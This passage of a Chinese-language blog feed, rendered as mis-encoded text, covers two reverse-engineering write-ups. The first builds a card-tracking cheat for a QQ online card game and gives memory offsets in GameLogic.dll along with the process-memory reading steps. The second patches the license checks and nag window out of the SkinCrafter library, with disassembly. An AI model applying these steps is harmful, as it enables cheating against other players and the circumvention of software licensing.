    Y = X + 1
else if (X &amp;gt;= 3 &amp;amp;&amp;amp; X &amp;lt;= 13)
    Y = X - 2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ—¶å€™æœæ–­è„‘è¡¥ï¼šç¬¬ä¸€ä¸ªå…ƒç´ å¯èƒ½æ˜¯1~15ï¼Œåˆšå¥½æ˜¯15ç§ç‰Œçš„ç‚¹æ•°ï¼ˆ3~10ï¼ŒJï¼ŒQï¼ŒKï¼ŒAï¼Œ2ï¼Œå°ç‹Fï¼Œå¤§ç‹Zï¼‰ã€‚å‡è®¾ç¬¬1ä¸ªå…ƒç´ å°±æ˜¯ç‚¹æ•°äº†ï¼Œé‚£ç¬¬3ä¸ªå…ƒç´ æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ ¹æ®ä¸Šé¢çš„ç®—æ³•ç”»å‡ºå¯¹åº”çš„è¡¨ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;| 3 ~ K  |  A  |  B  |  F  |  Z  |
----------------------------------
| 1 ~ 11 |  12 |  14 |  15 |  16 |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æœ‰ç†ç”±è¿™æ ·æ¨æµ‹ï¼šç¬¬3ä¸ªå…ƒç´ æ˜¯ç”¨æ¥æ¯”è¾ƒç‰Œçš„ç‚¹æ•°å¤§å°çš„ï¼Œè€Œè‡³äºä¸ºä»€ä¹ˆAå’ŒBä¹‹é—´ç©ºä¸€ä¸ªæ•°ï¼Œå¾ˆå¯èƒ½æ˜¯ä¸ºé¡ºå­è®¾è®¡çš„ï¼Œå› ä¸ºé¡ºå­åªèƒ½ä»3è¿åˆ°Aã€‚&lt;/p&gt;
&lt;p&gt;åœ¨éªŒè¯çŒœæƒ³ä¹‹å‰è¿˜éœ€è¦åšä¸€ä»¶äº‹ï¼Œå°±æ˜¯ç¡®å®šç‰Œæ˜¯æŒ‰ç…§ä»å¤§åˆ°å°è¿˜æ˜¯ä»å°åˆ°å¤§æ’åˆ—çš„ï¼ŒåŒæ—¶ç¡®å®šå¤§å°æ¯”è¾ƒæ˜¯æ ¹æ®ç‰Œçš„ç‚¹æ•°æ•°å€¼ï¼ˆç¬¬1ä¸ªå…ƒç´ ï¼‰è¿˜æ˜¯ç‚¹æ•°å¤§å°ï¼ˆç¬¬3ä¸ªå…ƒç´ ï¼‰å†³å®šçš„ã€‚åªæœ‰å››ç§å¯èƒ½æ€§ï¼Œä¾ç„¶ç›´æ¥ç©·ä¸¾æµ‹è¯•ã€‚æ‰“å¼€CEï¼Œè®¾å®šæ•°æ®é•¿åº¦ä¸ºbyteï¼Œæµ‹è¯•ç‰Œé¢ç‚¹æ•°ã€‚æœ€åå¾—åˆ°çš„ç»“è®ºæ˜¯ï¼Œç‰Œåœ¨å†…å­˜ä¸­æ˜¯æŒ‰ç…§ç‚¹æ•°å¤§å°ä»å¤§åˆ°å°æ’åˆ—çš„ï¼ˆæœ€å¤§çš„ç‰Œæ˜¯æ•°ç»„çš„èµ·å§‹ï¼‰ã€‚åœ¨éªŒè¯å†…å­˜æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶ç¡®å®šäº†æ¯å¼ ç‰Œçš„å­˜å‚¨ç©ºé—´æ˜¯4bytesï¼Œå‰é¢æ²¡æ³•ç¡®å®šçš„ç¬¬0ä¸ªå…ƒç´ å®é™…ä¸Šæ˜¯èŠ±è‰²ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;  ç‹  é»‘æ¡ƒ  çº¢æ¡ƒ  æ¢…èŠ±  æ–¹ç‰‡
-----------------------------
  0    1     2     3     4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è‡³æ­¤ï¼Œæ¯å¼ ç‰Œåœ¨å†…å­˜ä¸­çš„è¡¨ç¤ºæ–¹æ³•å·²ç»ç¡®å®šï¼š&lt;code&gt;[èŠ±è‰²][ç‚¹æ•°][0][å¤§å°]&lt;/code&gt;ï¼Œå„å 1byteã€‚æ— è®ºæ‰€æœ‰ç©å®¶å‡ºçš„ç‰Œè¿˜æ˜¯ç©å®¶è‡ªå·±çš„ç‰Œï¼Œåªè¦æ‰¾åˆ°æœ€å¤§ä¸€å¼ ç‰Œçš„èŠ±è‰²ä½ç½®å’Œç‰Œçš„æ•°é‡ï¼Œæ ¹æ®æ¯å¼ ç‰Œå 4bytesï¼Œå°±å¯ä»¥ä»å†…å­˜ä¸­æ‹¿å‡ºè¿™ç»„ç‰Œæ•°æ®ã€‚ä¸‹é¢æ˜¯æˆ‘æ‰¾åˆ°çš„å„ç§æƒ…å†µä¸‹æœ€å¤§ç‰Œçš„èµ·å§‹ä½ç½®ï¼ˆå’Œæ‰¾åº§ä½å·æ—¶å€™ç¡®å®šæŒ‡é’ˆçš„æ–¹æ³•ä¸€è‡´ï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;ç©å®¶æ‰‹é‡Œçš„ç‰Œï¼š     [[&amp;quot;GameLogic.dll&amp;quot;+3DAB8]+108]
ä¸‹å®¶æœ€åå‡ºçš„ç‰Œ:    [[&amp;quot;GameLogic.dll&amp;quot;+3DABC]+118]
ä¸Šå®¶æœ€åå‡ºçš„ç‰Œ:    [[&amp;quot;GameLogic.dll&amp;quot;+3DABC]+2f8]
å·¦å®¶æœ€åå‡ºçš„ç‰Œ:    [[&amp;quot;GameLogic.dll&amp;quot;+3DABC]+28]
å³å®¶æœ€åå‡ºçš„ç‰Œ:    [[&amp;quot;GameLogic.dll&amp;quot;+3DABC]+208]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ‰€æœ‰åŸºå€åŸºäºGameLogic.dllï¼Œè€Œä¸”æœ€åå‡ºçš„ç‰Œç¬¬ä¸€æ¬¡åç§»éƒ½æ˜¯0x3DABCï¼ŒGood job!&lt;/p&gt;
&lt;h1&gt;Day2 å®ç°é€»è¾‘&lt;/h1&gt;
&lt;p&gt;å·¥ä½œé‡æœ€å¤§æœ€çƒ§è„‘çš„Day1è¿‡å»äº†ï¼ŒDay2å°±è½»æ¾äº†å¾ˆå¤šã€‚å†™ä»£ç ä¹‹å‰å½“ç„¶æ˜¯è¦ç¡®å®šè¯­è¨€å•¦ï¼Œä¸€èˆ¬æ¥è¯´å†™å¤–æŒ‚éƒ½ç”¨C++ï¼Œæ¯•ç«Ÿè¦ç›´æ¥å’ŒWindowsçš„APIæ‰“äº¤é“ã€‚ä½†æ˜¯ä¸ºäº†å¿«ï¼ˆlanï¼‰ï¼Œæˆ‘å†³å®šç”¨Pythonâ€¦â€¦&lt;/p&gt;
&lt;h2&gt;è·å–å†…å­˜æ•°æ®&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;é¦–å…ˆæ‰¾åˆ°æ¸¸æˆçš„è¿›ç¨‹ï¼Œé€šè¿‡è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶åskrpg.exeæ‰¾åˆ°ç›¸åº”çš„è¿›ç¨‹pidï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡çª—å£æ ‡é¢˜å€ŸåŠ©FindWindowæ¥æ‹¿pidï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;æ ¹æ®pidæ‰§è¡ŒOpenProcessã€‚&lt;/li&gt;
&lt;li&gt;ç”±äºåœ°å€åç§»æ˜¯æ ¹æ®GameLogic.dllè¿™ä¸ªæ¨¡å—ç¡®å®šçš„ï¼Œå› æ­¤éœ€è¦è¯»å–è¯¥æ¨¡å—çš„åŸºå€ï¼šåˆ©ç”¨EnumProcessModulesExå¾—åˆ°æ‰€æœ‰å·²ç»åŠ è½½çš„æ¨¡å—çš„å¥æŸ„ï¼ˆæ³¨æ„æƒé™ä¸ºLIST_MODULES_ALLï¼‰&lt;/li&gt;
&lt;li&gt;éå†æ¨¡å—å¥æŸ„ï¼Œä½¿ç”¨GetModuleFileNameExæ¥å¾—åˆ°æ¨¡å—åï¼Œæ‰¾åˆ°GameLogic.dllï¼Œé€šè¿‡GetModuleInformationå¾—åˆ°æ¨¡å—ä¿¡æ¯ï¼ŒlpBaseOfDllå³ä¸ºæ¨¡å—è½½å…¥çš„åŸºå€ã€‚&lt;/li&gt;
&lt;li&gt;é€šè¿‡ReadProcessMemoryè·å–æŒ‡å®šä½ç½®å’Œé•¿åº¦çš„æ•°æ®ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¾ˆé—æ†¾æ²¡æœ‰ä¸€ä¸ªå®Œæ•´çš„åº“å®ç°äº†è¿™äº›APIçš„Pythonå°è£…ï¼ŒPywin32ä¹Ÿåªå®ç°äº†éƒ¨åˆ†ã€‚æ‰€ä»¥æˆ‘ä½¿ç”¨psutilåº“è·å–pidï¼Œå…¶ä»–éƒ½æ˜¯é€šè¿‡ctypeæŠŠPythonæ•°æ®è½¬æ¢æˆCçš„æ•°æ®ç±»å‹åç›´æ¥è°ƒç”¨ç³»ç»ŸAPIå®ç°çš„ï¼ˆæ­¤å¤„å¯ä»¥å‚è€ƒWinAppDbgçš„ä»£ç ï¼Œå¾ˆå¯æƒœå®ƒä½¿ç”¨Python2.7å®ç°ï¼Œæˆ‘ç”¨çš„æ˜¯3.4ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥ç”¨è¿™ä¸ªåº“ï¼Œéœ€è¦æå–å’Œæ”¹å†™ï¼‰ã€‚&lt;/p&gt;
&lt;h2&gt;ä¸»é€»è¾‘&lt;/h2&gt;
&lt;p&gt;å½“æ‰€æœ‰ç©å®¶å‰©ä½™ç‰Œçš„æ•°é‡ä¸º27æ—¶æ¸¸æˆå¼€å§‹ï¼Œæ‰€æœ‰æ•°é‡ä¸º0çš„æ—¶å€™æ¸¸æˆç»“æŸï¼ˆæµ‹è¯•å‘ç°å½“æ¸¸æˆç»“æŸçš„æ—¶å€™æ‰€æœ‰ç©å®¶ç‰Œä¼šè¢«ç¬é—´ç½®0ï¼‰ã€‚&lt;code&gt;ç©å®¶æ¯æ¬¡å‡ºç‰Œæ•°é‡=ä¸Šæ¬¡æ‰‹é‡Œå‰©ä¸‹ç‰Œçš„æ•°é‡-ç›®å‰æ‰‹é‡Œç‰Œçš„æ•°é‡&lt;/code&gt;ï¼Œå½“å‡ºç‰Œæ•°é‡ä¸ä¸º0çš„æ—¶å€™ï¼ˆ0æ˜¯ä¸å‡ºï¼‰ï¼Œåˆ™åˆ©ç”¨è¿™ä¸ªé•¿åº¦å’Œæœ€å¤§ç‰Œçš„ä½ç½®è¯»å–è¿™ç»„ç‰Œã€‚&lt;/p&gt;
&lt;h1&gt;Day3 ç•Œé¢å®ç°&lt;/h1&gt;
&lt;p&gt;æ—¢ç„¶ä¸Šäº†Pythonçš„èˆ¹ï¼Œå›¾å½¢ç•Œé¢å°±é¡ºç†æˆç« çš„PyQtäº†ï¼Œåæ­£Qtæˆ‘è¿˜æ˜¯æ¯”è¾ƒç†Ÿçš„ï¼ŒPyQtç”¨æ³•å·®ä¸äº†å¤šå°‘ã€‚è¿™é‡Œè¦é„™è§†ä¸‹PyQtçš„æ–‡æ¡£ï¼Œå¤§éƒ¨åˆ†éƒ½ä¾èµ–äºQtå®˜ç½‘ï¼Œä½ è®©åªä¼šPythonä¸ä¼šC++çš„æ€ä¹ˆæï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç¨‹åºè®¾è®¡ä¸ºåŒçº¿ç¨‹ï¼Œä¸€ä¸ªå›¾å½¢çº¿ç¨‹ï¼Œä¸€ä¸ªå·¥ä½œçº¿ç¨‹ï¼Œçº¿ç¨‹é—´é€šä¿¡é€šè¿‡Qtç‰¹æœ‰çš„Signal/Slotå®ç°ã€‚&lt;/p&gt;
&lt;p&gt;ç”±äºæ¯ä¸ªäººå¯¹äºè®°ç‰Œå™¨æœ€ç»ˆåŠŸèƒ½è®¾è®¡çš„ä¸ä¸€è‡´ï¼Œæ‰€ä»¥åœ¨å†™å›¾å½¢ç•Œé¢çš„æ—¶å€™ä¹Ÿä¼šæœ‰å¾ˆå¤§çš„å·®å¼‚ã€‚æˆ‘ç›®å‰ç²—ç•¥çš„å®ç°äº†æ˜¾ç¤ºç©å®¶å‰©ä½™ç‰Œæ•°ã€å·²ç»å‡ºçš„ç‰Œä»¥åŠé™¤äº†è‡ªå·±çš„ç‰Œä»¥å¤–è¿˜å‰©ä¸‹çš„ç‰Œã€‚&lt;/p&gt;
&lt;p&gt;è¿™è¾¹éœ€è¦ç‰¹åˆ«è¯´æ˜ä¸€ä¸‹ä¸€ä¸ªä¸å¯é¿å…çš„é—®é¢˜ï¼šç©å®¶çš„åº§ä½ã€‚å½“ç©å®¶å…¥åº§åï¼Œæ— è®ºä»–åœ¨æ¸¸æˆå¤§å…ä¸­æ˜¯å“ªä¸ªåº§ä½ï¼Œä»–çš„ä½ç½®ä¸€å®šæ˜¯æ˜¾ç¤ºåœ¨æœ€ä¸‹é¢çš„ã€‚æˆ‘ä¸Šé¢ä¸€ç›´å¼ºè°ƒæ— è®ºæ˜¯ç©å®¶å‰©ä½™çš„ç‰Œæ•°è¿˜æ˜¯ç©å®¶æ‰“å‡ºå»çš„ç‰Œï¼Œéƒ½æ˜¯æ ¹æ®å¤§å…ä¸­çš„ç»å¯¹ä½ç½®æ¥ç¡®å®šçš„ã€‚æ‰€ä»¥è¿™é‡Œæ¶‰åŠåˆ°è®¡ç®—ç›¸å¯¹åº§ä½çš„é—®é¢˜ï¼Œå…¬å¼å…¶å®å¾ˆç®€å•ï¼š&lt;code&gt;ç›¸å¯¹åº§ä½ = (åº§ä½-ç©å®¶è‡ªå·±çš„åº§ä½) MOD 4&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åä¸Šä¸€å¼ æˆå“å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="../statics/qq-card-game-recorder/recorder.jpg" /&gt;&lt;/p&gt;
&lt;h1&gt;DayN å®Œå–„å’Œåè¯&lt;/h1&gt;
&lt;p&gt;æ‰¾å…«é˜¿å“¥ï¼ˆbugï¼‰å½“ç„¶æ˜¯ä¸å¯ç¼ºå°‘çš„é‡è¦ä¸€æ­¥ï¼Œä¸ç„¶æ€ä¹ˆåšç¬¬å…«ä¸ªç”·äººï¼ˆDebug Manï¼‰å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;QQæ–°åŒæ‰£è§’è‰²ç‰ˆçš„å†…å­˜æ•°æ®æŠ“å–æ€»çš„æ¥è¯´æ²¡æœ‰ç¢°åˆ°ç‰¹åˆ«å¤§çš„é—®é¢˜ï¼Œä¸»è¦è¿˜æ˜¯å› ä¸ºæ•°æ®æ²¡æœ‰åŠ å¯†ï¼Œå› æ­¤å¯ä»¥é çŒœæƒ³å’ŒCEçš„è¾…åŠ©æœ€ç»ˆæ‰¾åˆ°æ•°æ®ã€‚GameLogic.dllä¹Ÿæ²¡æœ‰åŠ å£³ï¼Œæ‰€ä»¥ç›´æ¥å°±èƒ½åœ¨IDAä¸­çœ‹åæ±‡ç¼–ï¼Œç›¸å¯¹ä¹Ÿé™ä½äº†ç ´è§£çš„é—¨æ§›ã€‚è”ç½‘æ¸¸æˆçš„ç ´è§£éš¾åº¦å°±æ˜¯å®æ—¶æ€§ï¼Œå› æ­¤å¾ˆéš¾ç”¨ODä¹‹ç±»çš„å·¥å…·æ¥ä¸‹æ–­ç‚¹è·Ÿè¸ªï¼Œæ‰€ä»¥æ¨æ–­çš„èƒ½åŠ›å’Œé˜…è¯»é™æ€åæ±‡ç¼–çš„èƒ½åŠ›éœ€è¦åŠ å¼ºã€‚&lt;/p&gt;</summary><category term="crack"></category><category term="reversing"></category><category term="cheater"></category><category term="game"></category></entry><entry><title>SkinCrafterç ´è§£ç¬”è®°</title><link href="http://blog.yyx.name/posts/skincrafter-crack-notes.html" rel="alternate"></link><updated>2014-11-09T23:46:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-11-09:posts/skincrafter-crack-notes.html</id><summary type="html">&lt;h1&gt;å¼€ç¯‡åºŸè¯&lt;/h1&gt;
&lt;p&gt;æœ€è¿‘çš„ä¸€ä¸ªWinä¸‹çš„å°é¡¹ç›®ï¼Œå›¾å½¢ç•Œé¢éœ€æ±‚ç®€å•ï¼Œå°±ç›´æ¥ä¸ŠMFCã€‚å®ŒæˆåæŸäººè§‰å¾—ç•Œé¢ä¸å¤Ÿå’Œè°ï¼Œäºæ˜¯å¾—æŠ˜è…¾ä¸‹ç•Œé¢ã€‚è²Œä¼¼ç›®å‰VC++ç•Œçš„UIä¸»æµæ˜¯MSè‡ªå®¶DirectUIæ€æƒ³ä¸‹çš„ä¸€äº›UIåº“ï¼Œå¯æƒœæœ¬äººçš„å“²å­¦â€œæ‡’â€å­—å½“å¤´ï¼Œå†å­¦ä¸€å¥—UIçš„ç”¨æ³•å®åœ¨æ˜¯è¦äº†äº²å‘½ï¼Œç›´æ¥æ”¾å¼ƒã€‚è®°å¾—æœ¬ç§‘æœŸé—´ç”¨è¿‡ä¸€ä¸ªSkin++çš„çš®è‚¤åº“ï¼ŒåŠ è½½åå¯ä»¥ç›´æ¥æ¢è‚¤ï¼Œå¯æƒœé‚£ç©æ„çš®è‚¤å¤ªå°‘ã€æ²¡æœ‰çš®è‚¤ç¼–è¾‘å™¨è€Œä¸”è²Œä¼¼å·²ç»åœæ­¢ç»´æŠ¤ï¼Œå› æ­¤ä½œç½¢ã€‚ågoogleåˆ°åŒä¸ºçš®è‚¤åº“çš„SkinCrafterï¼Œå¹¶ä¸‹äº†3.4.4çš„ç ´è§£ç‰ˆï¼Œå¯æƒœåœ¨VS2010ä¸‹æ•´åˆåMessageBoxçš„æŒ‰é’®åº•è‰²åœ¨Win7ä¸‹æ— æ³•åŒ¹é…çš®è‚¤è®¾ç½®ï¼ˆå®˜ç½‘æŸ¥é˜…åå‘ç°æ˜¯bugï¼Œæ–°ç‰ˆå·²è§£å†³ï¼‰ï¼Œé‚æ¢åˆ°3.8.0ã€‚è¯¥ç‰ˆæœ¬çš„VS2012æœ‰ç›¸å…³ç ´è§£ç‰ˆï¼Œä½†VS2010æ²¡æœ‰ï¼Œäºæ˜¯è‡ªå·±ä¸Šæ‰‹ç ´è§£ï¼ˆæ­£æ‰€è°“å­¦ä¼šç ´è§£ï¼Œç”¨Dç‰ˆè½¯ä»¶éƒ½æœ‰åº•æ°”äº†ï¼‰ï¼ŒèŠ±äº†å·®ä¸å¤šå¿«2å°æ—¶æœ€ç»ˆæˆåŠŸï¼Œå¹¶è®°å½•æˆæœ¬æ–‡ã€‚&lt;/p&gt;
&lt;h1&gt;Dllç‰ˆå·¥ä½œæµç¨‹&lt;/h1&gt;
&lt;p&gt;å¯¹äºVC/MFCç¨‹åºï¼ŒSkinCrafteræœ‰Dll/ActiveXä¸¤ä¸ªç‰ˆæœ¬ï¼Œæˆ‘ä¸ªäººå–œæ¬¢ä½¿ç”¨Dllç‰ˆï¼ˆä¸¤ä¸ªç‰ˆæœ¬çš„ç ´è§£æ–¹æ³•å…¶å®æ˜¯ä¸€æ ·çš„ï¼‰ã€‚ä¸‹é¢ä»‹ç»Dllç‰ˆæœ¬å®˜æ–¹çš„ä½¿ç”¨æ–¹æ³•ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é¦–å…ˆéœ€è¦å¼•å…¥CSCSkin.hå’ŒCSCSkin.cppæ–‡ä»¶ï¼Œå¹¶å°†dllåŠçš®è‚¤æ–‡ä»¶.skfæ”¾åœ¨ç›®å½•ä¸‹ã€‚&lt;/li&gt;
&lt;li&gt;å®ä¾‹åŒ–CSCSkinå¯¹è±¡m_skinï¼Œå¹¶åœ¨Appçš„InitInstance()ä¸­æ‰§è¡ŒInit()ã€LoadSkinFromFile()åŠApplySkin()ä¸‰ä¸ªå‡½æ•°ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¯¹æ¯”ActiveXç‰ˆæœ¬ï¼Œå¯ä»¥å‘ç°å°‘æ‰§è¡Œå¥½å‡ ä¸ªå‡½æ•°ï¼Œå…¶å®è¿™äº›å‡½æ•°åœ¨Init()æ–¹æ³•ä¸­éƒ½å®Œæˆäº†ï¼Œæ‰€ä»¥çœŸæ­£çš„å·¥ä½œæµç¨‹æ˜¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å®šä¹‰äº†Dllå¯¼å‡ºè¡¨ä¸­æ‰€æœ‰çš„å‡½æ•°æŒ‡é’ˆã€‚&lt;/li&gt;
&lt;li&gt;é€šè¿‡LoadLibrary()åŠ è½½Dllï¼Œå¹¶æ‰§è¡ŒInitLicenKeys()å’ŒInitDecoration()ã€‚&lt;/li&gt;
&lt;li&gt;LoadSkinFromFile()åŠ è½½çš®è‚¤ã€‚&lt;/li&gt;
&lt;li&gt;ApplySkin()åº”ç”¨çš®è‚¤ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;InitLicenKeyså‡½æ•°ç ´è§£&lt;/h1&gt;
&lt;p&gt;è¿™ä¸ªå‡½æ•°ç”¨äºå†™å…¥æ³¨å†Œä¿¡æ¯ï¼Œå¯¹äºDEMOç‰ˆï¼Œè¯¥å‡½æ•°çš„4ä¸ªå‚æ•°æ˜¯å®šæ­»çš„ã€‚å…¶å®ä¸ç ´è§£è¿™ä¸ªå‡½æ•°ä¹Ÿæ— æ‰€è°“ï¼Œåæ­£å†™åœ¨ç¨‹åºé‡Œé¢ï¼Œä½†æ˜¯çœŸè¦ç ´è§£ä¹Ÿå¾ˆç®€å•ã€‚&lt;/p&gt;
&lt;p&gt;ç”±äºæ˜¯ç®€å•çš„å›ºå®šå­—ç¬¦ä¸²åŒ¹é…ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ›¿æ¢Dllä¸­çš„å­—ç¬¦ä¸²ã€‚å½“ç„¶è¿˜å¯ä»¥é‡‡ç”¨çˆ†ç ´çš„æ–¹æ³•ï¼Œè¿™æ ·æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½è¡Œã€‚&lt;/p&gt;
&lt;p&gt;æŸ¥æ‰¾å››ä¸ªå‚æ•°ä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘è¿™å„¿ç”¨DEMOSKINCRAFTERLICENCEï¼ˆæ¯”è¾ƒæœ‰ä»£è¡¨æ€§ï¼‰ï¼Œå®šä½åˆ°ç¨‹åºã€‚å‘ç°æœ‰ä¸¤ä¸ªå¤„strcmp()æ¯”è¾ƒå­—ç¬¦ä¸²å¹¶ä½œå‡ºæ¯”è¾ƒå’Œè·³è½¬ï¼Œå› æ­¤ç›´æ¥nopæ‰è·³è½¬å³å¯ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
10005A49  |&amp;gt; \85C0          test eax,eax
10005A4B  |.  75 48         jnz XSkinCraf.10005A95                   ;  ç¬¬ä¸€æ¬¡è·³è½¬åˆ¤æ–­
10005A4D  |.  8B45 14       mov eax,[arg.4]
10005A50  |.  B9 8C420610   mov ecx,SkinCraf.1006428C                ;  DEMOSKINCRAFTERLICENCE
...
10005A7A  |&amp;gt;  85C0          test eax,eax
10005A7C  |.  75 17         jnz XSkinCraf.10005A95                   ;  ç¬¬äºŒæ¬¡è·³è½¬åˆ¤æ–­
10005A7E  |.  5E            pop esi
10005A7F  |.  B8 01000000   mov eax,0x1
10005A84  |.  5B            pop ebx
10005A85  |.  8B4D FC       mov ecx,[local.1]
10005A88  |.  33CD          xor ecx,ebp
10005A8A  |.  E8 E91E0500   call SkinCraf.10057978
10005A8F  |.  8BE5          mov esp,ebp
10005A91  |.  5D            pop ebp
10005A92  |.  C2 1000       retn 0x10
10005A95  |&amp;gt;  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL
10005A97  |.  68 80420610   push SkinCraf.10064280                   ; |SkinCrafter
10005A9C  |.  68 D8410610   push SkinCraf.100641D8                   ; |You are using DEMO version of SkinCrafter. InitLicenKeys function parameters should be: SKINCRAFTER, SKINCRAFTER.COM, support@skincrafter.com, DEMOSKINCRAFTERLICENCE
10005AA1  |.  6A 00         push 0x0                                 ; |hOwner = NULL
10005AA3  |.  FF15 4C350610 call dword ptr ds:[&amp;lt;&amp;amp;USER32.MessageBoxA&amp;gt;&amp;gt;; \MessageBoxA
...
&lt;/code&gt;&lt;/pre&gt;

&lt;h1&gt;å»é™¤å¼¹å‡ºæ¡†&lt;/h1&gt;
&lt;p&gt;æœ€æ˜æ˜¾çš„è«è¿‡äºè¿™ä¸ªå¼¹å‡ºæ¡†ï¼Œç¨‹åºå¯åŠ¨åå°±ä¼šå‡ºç°ã€‚è¯¥å¼¹å‡ºæ¡†æ— è¾¹æ¡†å¯æ‹–åŠ¨ï¼Œè€Œä¸”å¼ºåˆ¶ç½®é¡¶ï¼ˆTOP_MOSTï¼‰ï¼Œå› æ­¤æƒ³åˆ°SetWindowPos()åŠSetWindowLong()ä¸¤ä¸ªå‡½æ•°ï¼Œä»”ç»†æŸ¥æ‰¾åå‡æ— æœã€‚åæ¥åˆæŸ¥æ‰¾äº†CreateWindow()ã€CreateRectRgn()åŠCreateRectRgnIndirect()ä¹Ÿæ²¡æœ‰å¾ˆå¥½çš„ä¸‹æ‰‹ä½ç½®ã€‚å°±åœ¨æ‰¾å‡½æ•°è¿™æ¡æ€è·¯æ²¡æœ‰çªç ´å£çš„æ—¶å€™ï¼Œçœ‹åˆ°å¼¹å‡ºçª—å£ä¸Šæœ‰ä¸€æ¡å¯ä»¥ç‚¹å‡»çš„ç½‘å€ï¼Œå› æ­¤ç›´æ¥æŸ¥å­—ç¬¦ä¸²æ‰¾è¿™ä¸ªç½‘å€ï¼Œç„¶åè·³è½¬åˆ°ç¨‹åºå¤„ã€‚&lt;/p&gt;
&lt;p&gt;æ‰¾åˆ°ç¨‹åºå¤„ä¹‹åç¿»çœ‹ä¸Šä¸‹æ–‡ï¼Œæ— éå°±åœ¨loadä¸€äº›èµ„æºï¼Œçªç„¶çœ‹åˆ°ShowWindow()å‡½æ•°ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;10002F40  /$  55            push ebp
10002F41  |.  8BEC          mov ebp,esp
...
10002F87  |.  68 F3000000   push 0xF3
10002F8C  |.  6A 02         push 0x2
10002F8E  |.  68 F3000000   push 0xF3
10002F93  |.  E8 D6410500   call &amp;lt;jmp.&amp;amp;mfc100.#AfxFindResourceHandle_1900&amp;gt;
10002F98  |.  50            push eax                                             ; |hInst
10002F99  |.  FF15 70350610 call dword ptr ds:[&amp;lt;&amp;amp;USER32.LoadBitmapW&amp;gt;]            ; \LoadBitmapW
10002F9F  |.  50            push eax
10002FA0  |.  B9 CC450710   mov ecx,SkinCraf.100745CC
10002FA5  |.  E8 BE410500   call &amp;lt;jmp.&amp;amp;mfc100.#CGdiObject::Attach_2184&amp;gt;
10002FAA  |.  A1 D0450710   mov eax,dword ptr ds:[0x100745D0]
10002FAF  |.  A3 D85F0710   mov dword ptr ds:[0x10075FD8],eax
10002FB4  |.  391D DC5F0710 cmp dword ptr ds:[0x10075FDC],ebx
10002FBA  |.  0F85 7C020000 jnz SkinCraf.1000323C
...
10003143  |.  A1 E05F0710   mov eax,dword ptr ds:[0x10075FE0]
10003148  |.  6A 01         push 0x1
1000314A  |.  51            push ecx
1000314B  |.  8BCC          mov ecx,esp
1000314D  |.  8965 DC       mov [local.9],esp
10003150  |.  68 843D0610   push SkinCraf.10063D84                               ;  http://www.skincrafter.com/order.html
10003155  |.  C780 84000000&amp;gt;mov dword ptr ds:[eax+0x84],0x497D
1000315F  |.  FF15 A4390610 call dword ptr ds:[&amp;lt;&amp;amp;mfc100.#ATL::CStringT&amp;lt;char,StrT&amp;gt;;  mfc100.#ATL::CStringT&amp;lt;char,StrTraitMFC_DLL&amp;lt;char,ATL::ChTraitsCRT&amp;lt;char&amp;gt; &amp;gt; &amp;gt;::CStringT&amp;lt;char,StrTraitMFC_DLL&amp;lt;char,ATL::ChTraitsCRT&amp;lt;char&amp;gt; &amp;gt; &amp;gt;_310
10003165  |.  8B0D E05F0710 mov ecx,dword ptr ds:[0x10075FE0]
...
1000323C  |&amp;gt;  8B0D DC5F0710 mov ecx,dword ptr ds:[0x10075FDC]
10003242  |.  6A 05         push 0x5
10003244  |.  E8 35410500   call &amp;lt;jmp.&amp;amp;mfc100.#CWnd::ShowWindow_12962&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼Œå‡½æ•°æ‰§è¡Œå®Œæˆä¹‹åä¼šShowWindow()ï¼Œè€Œå½“å‚æ•°ä¸º5çš„æ—¶å€™ï¼Œå°±æ˜¯SW_SHOWï¼Œå› æ­¤å¯ä»¥å°†pushçš„å‚æ•°è®¾ç½®ä¸º0(SW_HIDE)æˆ–è€…ç›´æ¥æŠŠæ•´åˆå‡½æ•°nopæ‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2014-12-03æ›´æ–°ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä»Šå¤©åœ¨é¡¹ç›®ä¸Šè°ƒè¯•çš„æ—¶å€™å‘ç°åˆå‡ºç°å¼¹çª—ï¼Œä½¿ç”¨ç›¸åŒçš„dllåœ¨çš®è‚¤æµ‹è¯•ç¨‹åºä¸Šåˆ™æ²¡æœ‰å‡ºç°ã€‚äºæ˜¯ç›´æ¥è°ƒè¯•é¡¹ç›®ç¨‹åºï¼Œå‘ç°è¿˜æœ‰å‡ å¤„ShowWindowå‡½æ•°ã€‚&lt;/p&gt;
